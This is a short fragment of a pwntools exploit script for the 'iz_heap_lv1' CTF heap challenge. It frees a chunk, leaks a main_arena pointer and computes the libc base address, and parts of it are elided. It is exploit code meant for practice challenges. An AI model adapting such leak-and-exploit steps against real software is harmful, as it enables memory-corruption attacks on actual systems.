...
context.binary = "./iz_heap_lv1_patched"
elf = context.binary
# libc = elf.libc
libc = ELF("./libc.so.6")
...
io = process("./iz_heap_lv1_patched")
# io = remote("node4.buuoj.cn", 29710)
...
delete(20)
show(True, '0' * 0x20)
libc.address = u64(io.recvuntil(b"\x7f")[-6: ] + b'\0\0') - 96 - libc.sym['main_arena']
